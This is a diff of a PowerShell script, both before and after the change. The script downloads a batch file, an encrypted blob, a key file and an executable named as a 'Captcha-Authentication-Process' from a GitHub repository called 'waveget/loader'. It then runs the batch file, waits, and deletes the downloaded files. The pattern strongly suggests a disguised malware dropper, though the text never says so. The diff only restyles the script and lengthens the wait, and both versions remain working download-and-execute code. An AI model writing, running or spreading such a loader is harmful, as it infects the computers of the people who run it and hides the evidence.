@@ -1,29 +1,19 @@
 # Define the download location
 $downloadPath = "C:\MyDownloads"
 # Create the directory if it doesn't exist
-if (-not (Test-Path -Path $downloadPath)) {
-    New-Item -ItemType Directory -Path $downloadPath
-}
+if (-not (Test-Path -Path $downloadPath)) { New-Item -ItemType Directory -Path $downloadPath }
 
-# Define the URLs
-$urls = @(
-    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat",
-    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin",
-    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin",
-    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe"
-)
-
-# Download the files
-foreach ($url in $urls) {
-    $fileName = Join-Path -Path $downloadPath -ChildPath (Split-Path -Path $url -Leaf)
-    Invoke-WebRequest -Uri $url -OutFile $fileName
-}
+# Download files
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat" -OutFile "$downloadPath\main.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$downloadPath\cipher.bin"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$downloadPath\key.bin"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe" -OutFile "$downloadPath\Captcha-Authentication-Process-820182.exe"
 
 # Run main.bat
-Start-Process -FilePath (Join-Path -Path $downloadPath -ChildPath "main.bat") -NoNewWindow
+Start-Process -FilePath "$downloadPath\main.bat" -NoNewWindow
 
 # Wait for 10 seconds
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 20
 
 # Delete all downloaded files
-Remove-Item -Path $downloadPath\* -Force
+Remove-Item -Path "$downloadPath\*"
